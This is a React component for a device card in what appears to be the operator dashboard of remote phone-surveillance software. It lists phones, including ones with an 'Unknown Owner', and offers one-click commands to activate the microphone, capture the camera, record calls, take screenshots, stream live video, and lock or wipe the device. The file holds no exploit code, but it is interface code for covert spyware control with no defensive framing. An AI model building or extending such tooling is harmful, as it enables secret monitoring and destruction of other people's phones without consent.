import React from 'react';
import { Smartphone, Battery, Signal, Mic, Camera, Phone, Video, Lock, Trash2, Crosshair } from 'lucide-react';
import { useTranslation } from 'react-i18next';
import { useNavigate } from 'react-router-dom';

interface DeviceCardProps {
  device: any;
  isSelected?: boolean;
  onSelect?: () => void;
}

const DeviceCard: React.FC<DeviceCardProps> = ({ device, isSelected, onSelect }) => {
  const { t } = useTranslation();
  const navigate = useNavigate();

  const handleCommand = (command: string) => {
    navigate('/remote-control', { state: { command, deviceId: device.device_id } });
  };

  return (
    <div 
      onClick={onSelect}
      className={`
        p-4 border-b border-border-color cursor-pointer transition-all hover:bg-bg-tertiary group
        ${isSelected ? 'bg-bg-tertiary border-l-4 border-l-accent-blue' : 'border-l-4 border-l-transparent'}
      `}
    >
      <div className="flex items-start justify-between mb-3">
        <div className="flex items-center gap-3">
          <div className={`
            w-10 h-10 rounded flex items-center justify-center relative
            ${device.is_online ? 'bg-accent-green/10 text-accent-green' : 'bg-bg-primary text-text-muted'}
          `}>
            <Smartphone size={20} />
            {device.is_online && <span className="absolute -top-1 -right-1 w-2 h-2 bg-accent-green rounded-full animate-pulse shadow-[0_0_8px_#00ff88]"></span>}
          </div>
          <div>
            <h3 className="font-bold text-text-primary leading-none font-tactical tracking-wide text-lg">{device.model}</h3>
            <span className="text-xs text-text-secondary font-mono">{device.name || 'Unknown Owner'}</span>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-2 mb-4 text-xs font-mono text-text-secondary">
        <div className="flex items-center gap-2 bg-bg-primary p-1.5 rounded border border-border-color/50">
          <Battery size={12} className={device.battery_level < 20 ? 'text-accent-red' : 'text-accent-green'} />
          <span>{device.battery_level}%</span>
        </div>
        <div className="flex items-center gap-2 bg-bg-primary p-1.5 rounded border border-border-color/50">
          <Signal size={12} className="text-accent-blue" />
          <span>{device.signal_strength}%</span>
        </div>
      </div>

      {isSelected && (
        <div className="grid grid-cols-4 gap-2 animate-in fade-in slide-in-from-top-2 duration-200">
          <ControlButton icon={<Mic size={14} />} label={t('command.actions.mic')} onClick={() => handleCommand('activate_mic')} />
          <ControlButton icon={<Camera size={14} />} label={t('command.actions.cam')} onClick={() => handleCommand('camera_capture')} />
          <ControlButton icon={<Phone size={14} />} label={t('command.actions.rec')} onClick={() => handleCommand('record_call')} />
          <ControlButton icon={<Crosshair size={14} />} label={t('command.actions.shot')} onClick={() => handleCommand('take_screenshot')} />
          <ControlButton icon={<Video size={14} />} label={t('command.actions.live')} onClick={() => handleCommand('start_stream')} />
          <ControlButton icon={<Lock size={14} />} label={t('command.actions.lock')} onClick={() => handleCommand('lock_device')} />
          <ControlButton icon={<Trash2 size={14} />} label={t('command.actions.wipe')} onClick={() => handleCommand('wipe_device')} danger />
        </div>
      )}
    </div>
  );
};

const ControlButton: React.FC<{ icon: React.ReactNode, label: string, danger?: boolean, onClick?: () => void }> = ({ icon, label, danger, onClick }) => (
  <button
    onClick={onClick}
    className={`
      flex flex-col items-center justify-center p-2 rounded gap-1 transition-all active:scale-95
      ${danger
        ? 'bg-accent-red/10 text-accent-red hover:bg-accent-red/20 border border-accent-red/20'
        : 'bg-bg-primary text-text-secondary hover:text-accent-blue hover:bg-bg-secondary border border-border-color hover:border-accent-blue/30'}
    `}
  >
    {icon}
    <span className="text-[9px] uppercase tracking-wider font-mono">{label}</span>
  </button>
);

export default DeviceCard;
